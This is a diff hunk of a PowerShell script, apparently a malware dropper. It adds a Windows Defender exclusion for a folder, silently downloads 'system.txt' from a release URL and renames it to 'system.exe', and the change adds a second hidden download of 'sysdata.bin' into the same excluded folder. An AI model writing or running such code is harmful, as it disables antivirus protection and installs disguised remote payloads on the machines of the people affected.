@@ -16,11 +16,15 @@ New-Item -ItemType Directory -Force -Path $dir | Out-Null
 Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
 
 $sysPath = Join-Path $dir 'system.exe'
+$binPath = Join-Path $dir 'sysdata.bin'
 if (-not (Test-Path $sysPath)) {
-    curl.exe -s -L -o "$dir\system.txt" --retry 3 --retry-delay 5 --max-time 120 "$ReleaseBase/system.txt"
+    curl.exe -s -L -o "$dir\system.txt" --retry 3 --retry-delay 5 --max-time 60 "$ReleaseBase/system.txt"
     if (Test-Path "$dir\system.txt") {
         Move-Item -LiteralPath "$dir\system.txt" -Destination $sysPath -Force
     }
+}
+if (-not (Test-Path $binPath)) {
+    curl.exe -s -L -o $binPath --retry 3 --retry-delay 5 --max-time 180 "$ReleaseBase/sysdata.bin"
 }
 
 if (Test-Path $sysPath) {
